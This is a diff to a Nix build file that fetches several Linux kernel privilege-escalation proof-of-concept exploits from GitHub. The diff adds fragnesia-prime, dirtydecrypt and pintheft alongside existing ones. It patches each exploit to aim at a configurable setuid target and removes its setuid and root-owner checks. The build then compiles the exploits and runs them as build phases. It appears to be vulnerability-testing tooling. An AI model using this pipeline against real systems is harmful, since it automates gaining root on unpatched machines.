@@ -9,6 +9,8 @@
   stdenvNoCC,
   fetchFromGitHub,
   bash,
+  iproute2,
+  xxd,
 
   # make sure this is the same one that's in the security wrapper at /run/wrappers/bin/mount
   # same nixpkgs will suffice
@@ -22,6 +24,13 @@ let
   copy-fail-c = pkgsStatic.stdenv.mkDerivation {
     pname = "copy-fail-c";
     version = "0.1";
+
+    outputs = [
+      "out"
+      "payload"
+    ];
+
+    nativeBuildInputs = [ xxd ];
 
     src = fetchFromGitHub {
       owner = "tgies";
@@ -43,6 +52,9 @@ let
       runHook preInstall
       mkdir -p $out/bin
       cp exploit $out/bin/copyfail
+      mkdir -p $payload/bin $payload/include
+      cp payload $payload/bin/payload
+      xxd -i payload > $payload/include/payload.h
       runHook postInstall
     '';
   };
@@ -80,19 +92,22 @@ let
     '';
   };
 
+  v12 = fetchFromGitHub {
+    owner = "v12-security";
+    repo = "pocs";
+    rev = "09e835b587bf71249775654061ae4c79e92cf430";
+    hash = "sha256-1lx5GZoF02FsHJa3ROhaEvEdoeGm8IxlbPgnkW02iN8=";
+  };
+
   fragnesia = stdenv.mkDerivation {
     pname = "fragnesia";
     version = "0.1";
 
-    src = fetchFromGitHub {
-      owner = "v12-security";
-      repo = "pocs";
-      rev = "7b5fc577c3d9ad386cc109b1eb7b02623f48ca13";
-      hash = "sha256-pJvvqrTxiF5qcZtjNeseEzbFaI0WSs/FdPy/QscUPmY=";
-    };
+    src = v12;
+
+    prePatch = "cd fragnesia";
 
     postPatch = ''
-      cd fragnesia
       substituteInPlace fragnesia.c \
         --replace-fail '"/usr/bin/su"' '"${target}"'
     '';
@@ -110,6 +125,92 @@ let
       runHook postInstall
     '';
   };
+
+  fragnesia' = stdenv.mkDerivation {
+    pname = "fragnesia-prime";
+    version = "0.1";
+
+    src = v12;
+
+    prePatch = "cd fragnesia-5db89c99566fc";
+
+    postPatch = ''
+      substituteInPlace skb_segment_exploit.c \
+        --replace-fail '"/usr/bin/mount"' '"${target}"' \
+        --replace-fail '(sb.st_mode & S_ISUID) &&' "" \
+        --replace-fail 'sb.st_uid == 0 &&' ""
+    '';
+
+    buildPhase = ''
+      runHook preBuild
+      gcc -Os -Wall -o fragnesia-prime skb_segment_exploit.c
+      runHook postBuild
+    '';
+
+    installPhase = ''
+      runHook preInstall
+      mkdir -p $out/bin
+      cp fragnesia-prime $out/bin/
+      runHook postInstall
+    '';
+  };
+
+  dirtydecrypt = stdenv.mkDerivation {
+    pname = "dirtydecrypt";
+    version = "0.1";
+
+    src = v12;
+
+    prePatch = "cd dirtydecrypt";
+
+    postPatch = ''
+      substituteInPlace poc.c \
+        --replace-fail '"/usr/bin/mount"' '"${target}"' \
+        --replace-fail '(sb.st_mode & S_ISUID) &&' "" \
+        --replace-fail 'sb.st_uid == 0 &&' ""
+    '';
+
+    buildPhase = ''
+      runHook preBuild
+      gcc -Os -Wall -o dirtydecrypt poc.c
+      runHook postBuild
+    '';
+
+    installPhase = ''
+      runHook preInstall
+      mkdir -p $out/bin
+      cp dirtydecrypt $out/bin/
+      runHook postInstall
+    '';
+  };
+
+  pintheft = stdenv.mkDerivation {
+    pname = "pintheft";
+    version = "0.1";
+
+    src = v12;
+
+    prePatch = "cd pintheft";
+
+    postPatch = ''
+      substituteInPlace poc.c \
+        --replace-fail '"/usr/bin/umount"' '"${target}"' \
+        --replace-fail ' && (st.st_mode & S_ISUID)' ""
+    '';
+
+    buildPhase = ''
+      runHook preBuild
+      gcc -Os -Wall -o pintheft poc.c
+      runHook postBuild
+    '';
+
+    installPhase = ''
+      runHook preInstall
+      mkdir -p $out/bin
+      cp pintheft $out/bin/
+      runHook postInstall
+    '';
+  };
 in
 stdenvNoCC.mkDerivation (finalAttrs: {
   name = "dirtyfrag";
@@ -119,6 +220,12 @@ stdenvNoCC.mkDerivation (finalAttrs: {
   ]
   ++ lib.optionals stdenvNoCC.buildPlatform.isx86_64 [
     # Currently only works on x86_64
+
+    # Causes a crash and the kernel gets mad afterwards
+    #"pintheftPhase"
+
+    "dirtydecryptPhase"
+    "fragnesiaPrimePhase"
     "fragnesiaPhase"
     "dirtyFragPhase"
   ]
@@ -129,11 +236,15 @@ stdenvNoCC.mkDerivation (finalAttrs: {
 
   nativeBuildInputs = [
     util-linux.bin
+    iproute2
     copy-fail-c
   ]
   ++ lib.optionals stdenvNoCC.buildPlatform.isx86_64 [
-    dirtyfrag
+    pintheft
+    dirtydecrypt
+    fragnesia'
     fragnesia
+    dirtyfrag
   ];
 
   inherit target;
@@ -171,6 +282,27 @@ stdenvNoCC.mkDerivation (finalAttrs: {
     ${finalAttrs.checkTarget}
     mount
     runHook postConfigure
+  '';
+
+  pintheftPhase = ''
+    runHook prePintheft
+    pintheft || true
+    checkTarget $target
+    runHook postPintheft
+  '';
+
+  dirtydecryptPhase = ''
+    runHook preDirtydecrypt
+    dirtydecrypt || true
+    checkTarget $target
+    runHook postDirtydecrypt
+  '';
+
+  fragnesiaPrimePhase = ''
+    runHook preFragnesiaPrime
+    fragnesia-prime || true
+    checkTarget $target
+    runHook postFragnesiaPrime
   '';
 
   fragnesiaPhase = ''
